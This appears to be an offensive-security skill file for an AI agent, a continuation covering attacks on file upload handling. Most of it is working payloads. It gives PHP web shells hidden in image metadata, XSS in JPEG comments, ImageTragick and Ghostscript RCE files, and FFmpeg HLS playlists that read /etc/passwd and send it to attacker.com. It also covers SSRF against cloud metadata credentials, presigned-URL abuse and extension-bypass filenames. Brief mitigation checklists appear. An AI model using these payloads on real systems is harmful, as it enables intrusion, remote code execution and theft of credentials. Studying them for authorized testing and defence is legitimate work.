# upload-insecure-files — 全文续篇

> 主卡保留前 12 节；本文件从第 13 节起。原文件：`/root/.hermes/skills/security/upload-insecure-files/SKILL.md`

## 12. POLYGLOT FILE TECHNIQUES

Files that are simultaneously valid in two or more formats, bypassing format-specific validation while delivering a dangerous payload.

### GIFAR (GIF + JAR)

```text
# GIF header + JAR appended
# GIF89a header (6 bytes) + padding + JAR archive (ZIP format)
# Browser: valid GIF image
# Java: valid JAR archive → applet execution (legacy)

cat header.gif payload.jar > gifar.gif
# Passes image validation, executes as Java applet if loaded via <applet>
```

### PNG + PHP polyglot

```bash
# Inject PHP code into PNG IDAT chunk or tEXt metadata
# The PNG renders as valid image; when included via LFI, PHP code executes

# Method 1: PHP in tEXt chunk
python3 -c "
import struct
png_header = b'\x89PNG\r\n\x1a\n'
# ... minimal IHDR + IDAT + tEXt chunk containing PHP
"

# Method 2: Use exiftool to inject into comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png
# Upload image.png → LFI include → PHP executes from metadata
```

### JPEG + JS polyglot

```bash
# JPEG comment marker (0xFFFE) can contain JavaScript
# If served with Content-Type: text/html (or MIME sniffing active):
exiftool -Comment='<script>alert(document.domain)</script>' photo.jpg

# Combined with content-type confusion → XSS via image upload
```

### PDF + JS polyglot

```text
# PDF header followed by JS:
%PDF-1.0
1 0 obj<</Pages 2 0 R>>endobj
2 0 obj<</Kids[3 0 R]/Count 1>>endobj
3 0 obj<</MediaBox[0 0 3 3]>>endobj
trailer<</Root 1 0 R>>
*/=alert('XSS')/*
```

---

## 13. IMAGEMAGICK EXPLOITATION CHAIN

### CVE-2016-3714 (ImageTragick) — RCE via Delegates

ImageMagick uses "delegates" (external programs) for certain format conversions. Specially crafted files trigger shell command execution:

### MVG (Magick Vector Graphics)

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

### SVG delegate abuse

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px">
  <image xlink:href="https://example.com/image.jpg&quot;|id > /tmp/pwned&quot;" x="0" y="0"/>
</svg>
```

### Ghostscript exploitation

ImageMagick delegates to Ghostscript for PDF/PS/EPS processing. Ghostscript has had multiple sandbox escapes:

```postscript
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id > /tmp/pwned) currentdevice putdeviceprops
```

Upload as `.eps`, `.ps`, or `.pdf` → ImageMagick invokes Ghostscript → RCE.

### Mitigation check

```text
□ Is ImageMagick policy.xml restricting dangerous coders?
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
□ Is Ghostscript updated and sandboxed (-dSAFER)?
```

---

## 14. FFMPEG SSRF & LOCAL FILE READ

### HLS playlist file read

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST
```

Upload as `.m3u8` or `.ts` → FFmpeg processes it → file content concatenated with header and sent to attacker server or embedded in output video.

### SSRF via HLS

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
```

FFmpeg fetches the URL server-side → SSRF to cloud metadata endpoint.

### Concat protocol for local file inclusion

```m3u8
#EXTM3U
#EXTINF:1,
concat:file:///etc/passwd|subfile,,start,0,end,0,,:
#EXT-X-ENDLIST
```

### AVI + subtitle SSRF

Create AVI with subtitle track referencing a URL:
```bash
ffmpeg -i input.avi -vf "subtitles=http://169.254.169.254/latest/meta-data/" output.avi
```

---

## 15. CLOUD STORAGE UPLOAD CONSIDERATIONS

### S3 Presigned URL Abuse

```text
# Presigned URL generated for specific key and content-type:
PUT https://bucket.s3.amazonaws.com/uploads/avatar.jpg
  ?X-Amz-Algorithm=AWS4-HMAC-SHA256&...&X-Amz-SignedHeaders=host;content-type

# Abuse: if content-type is NOT in SignedHeaders:
# Change Content-Type from image/jpeg to text/html → upload XSS payload
# The signature remains valid because content-type wasn't signed

# If path is not signed (only prefix):
# Change key from uploads/avatar.jpg to uploads/../admin/config.json
```

**Audit checklist**:
```text
□ Which headers are included in SignedHeaders? (must include content-type)
□ Is the full key path signed or just a prefix?
□ Is the upload bucket the same as the serving bucket? (write to CDN-served bucket → stored XSS)
□ Is the ACL signed? (prevent setting public-read on sensitive uploads)
```

### Azure Blob Storage SAS Token

```text
# SAS token scope issues:
# Container-level SAS with write permission → write to ANY blob in container
# Service-level SAS → may allow listing/reading other blobs
# Check: sr= (signed resource), sp= (signed permissions), se= (expiry)
```

### GCS Signed URL

```text
# Similar to S3 — check if Content-Type is included in signature
# Resumable upload URLs may have broader permissions than intended
# V4 signed URLs: verify X-Goog-SignedHeaders includes content-type
```

---

## 16. CONTENT-TYPE VALIDATION BYPASS

### Double extensions

```text
shell.php.jpg          → Apache with AddHandler may execute as PHP
shell.asp;.jpg         → IIS semicolon truncation
shell.php%00.jpg       → Null byte truncation (PHP < 5.3.4, old Java)
shell.php.xxxxx        → Unknown extension → Apache falls back to previous handler
```

### MIME sniffing exploitation

When server sends no `Content-Type` or `X-Content-Type-Options: nosniff` is missing:

```text
# Upload file with HTML/JS content but image extension
# Browser MIME-sniffs content → executes as HTML
# Works for stored XSS even when extension validation passes
```

### Content-Type header vs extension mismatch

```text
# Upload request:
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

# File content: <?php system($_GET['cmd']); ?>

# Server trusts Content-Type header (image/jpeg) → passes validation
# But stores with .php extension based on other logic → executes as PHP
```

### Case variation

```text
shell.PhP    shell.pHP    shell.Php
shell.aSp    shell.jSp    shell.ASPX
```

### Trailing characters

```text
shell.php.      → trailing dot (Windows strips it)
shell.php::$DATA → NTFS alternate data stream (IIS)
shell.php\x20   → trailing space
shell.php%20    → URL-encoded space
```

